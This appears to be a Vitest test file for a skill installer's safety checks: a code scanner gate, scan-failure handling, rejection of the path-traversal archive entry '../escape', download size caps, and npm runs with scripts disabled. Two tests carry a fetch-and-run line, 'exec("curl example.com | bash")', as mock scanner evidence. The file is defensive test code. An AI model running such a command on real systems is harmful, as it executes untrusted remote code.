import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { Readable } from "node:stream";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { installSkill } from "./skills-install.js";

const runCommandWithTimeoutMock = vi.fn();
const scanDirectoryWithSummaryMock = vi.fn();
const fetchWithSsrFGuardMock = vi.fn();

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../infra/net/fetch-guard.js", () => ({
  fetchWithSsrFGuard: (...args: unknown[]) => fetchWithSsrFGuardMock(...args),
}));

vi.mock("../security/skill-scanner.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../security/skill-scanner.js")>();
  return {
    ...actual,
    scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
  };
});

vi.mock("./skills.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./skills.js")>();
  return {
    ...actual,
    hasBinary: vi.fn(() => true),
  };
});

async function writeInstallableSkill(
  workspaceDir: string,
  name: string,
  installSpecsJson = '[{"id":"deps","kind":"node","package":"example-package"}]',
): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":${installSpecsJson}}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    fetchWithSsrFGuardMock.mockReset();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 1,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
    fetchWithSsrFGuardMock.mockResolvedValue({
      response: {
        ok: true,
        status: 200,
        statusText: "OK",
        body: Readable.from(["archive-bytes"]),
      },
      release: async () => {},
    });
    delete process.env.OPENCLAW_SKILL_DOWNLOAD_MAX_BYTES;
    delete process.env.OPENCLAW_SKILL_ARCHIVE_MAX_ENTRIES;
    delete process.env.OPENCLAW_SKILL_ARCHIVE_MAX_BYTES;
    delete process.env.OPENCLAW_ALLOW_NPM_SCRIPTS;
    delete process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL;
  });

  it("blocks install when critical findings are present", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("critical issue");
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("allows critical findings only when explicitly overridden", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    const previousUnsafeInstall = process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL;
    process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL = "1";
    try {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
    } finally {
      if (previousUnsafeInstall === undefined) {
        delete process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL;
      } else {
        process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL = previousUnsafeInstall;
      }
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("blocks install when skill scan fails", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL=1");
      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
        true,
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("allows skill scan failure only when explicitly overridden", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    const previous = process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL;
    process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL = "1";
    try {
      await writeInstallableSkill(workspaceDir, "scanfail-skill-override");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill-override",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(
        result.warnings?.some((warning) =>
          warning.includes("continuing install without scanner coverage"),
        ),
      ).toBe(true);
    } finally {
      if (previous === undefined) {
        delete process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL;
      } else {
        process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL = previous;
      }
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("blocks unsafe archive paths before extraction", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(
        workspaceDir,
        "archive-skill",
        '[{"id":"fetch","kind":"download","url":"https://example.com/archive.zip","extract":true,"archive":"zip"}]',
      );
      runCommandWithTimeoutMock.mockResolvedValueOnce({
        code: 0,
        stdout: "../escape\nsafe/file.txt\n",
        stderr: "",
        signal: null,
        killed: false,
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "archive-skill",
        installId: "fetch",
      });

      expect(result.ok).toBe(false);
      expect(result.stderr).toContain("blocked unsafe archive entry");
      expect(
        runCommandWithTimeoutMock.mock.calls.some((call) => (call[0] as string[]).includes("-q")),
      ).toBe(false);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("enforces skill download byte caps", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(
        workspaceDir,
        "download-cap-skill",
        '[{"id":"fetch","kind":"download","url":"https://example.com/archive.zip","extract":false}]',
      );
      process.env.OPENCLAW_SKILL_DOWNLOAD_MAX_BYTES = "4";
      fetchWithSsrFGuardMock.mockResolvedValueOnce({
        response: {
          ok: true,
          status: 200,
          statusText: "OK",
          body: Readable.from(["12345"]),
        },
        release: async () => {},
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "download-cap-skill",
        installId: "fetch",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("Download too large");
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("runs npm installs with ignore-scripts and scrubbed env by default", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(workspaceDir, "deps-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 0,
        warn: 0,
        info: 0,
        findings: [],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "deps-skill",
        installId: "deps",
      });
      expect(result.ok).toBe(true);
      const installCall = runCommandWithTimeoutMock.mock.calls.find(
        (call) => Array.isArray(call[0]) && call[0][0] === "npm" && call[0][1] === "install",
      );
      expect(installCall).toBeTruthy();
      const args = installCall?.[0] as string[];
      const options = installCall?.[1] as {
        inheritProcessEnv?: boolean;
        env?: Record<string, string>;
      };
      expect(args).toContain("--ignore-scripts");
      expect(options.inheritProcessEnv).toBe(false);
      expect(options.env?.npm_config_ignore_scripts).toBe("true");
      expect(options.env?.NPM_CONFIG_IGNORE_SCRIPTS).toBe("true");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});
